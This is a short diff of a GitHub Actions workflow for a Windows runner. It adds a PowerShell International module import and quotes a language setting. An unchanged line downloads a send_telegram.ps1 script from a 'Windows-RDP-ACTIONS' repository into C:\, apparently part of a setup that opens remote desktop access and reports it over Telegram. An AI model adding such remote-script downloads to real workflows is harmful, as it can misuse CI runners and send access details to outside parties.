@@ -27,8 +27,9 @@ jobs:
             exit 1
         }
 
+    - run: Import-Module -Name International -UseWindowsPowerShell -Verbose
     - run: |
-        Set-WinUserLanguageList -LanguageList en-US -Force
+        Set-WinUserLanguageList -LanguageList "en-US" -Force
          
     - run: Invoke-WebRequest https://github.com/CI-Devs/Windows-RDP-ACTIONS/raw/main/send_telegram.ps1 -OutFile C:\send_telegram.ps1
     
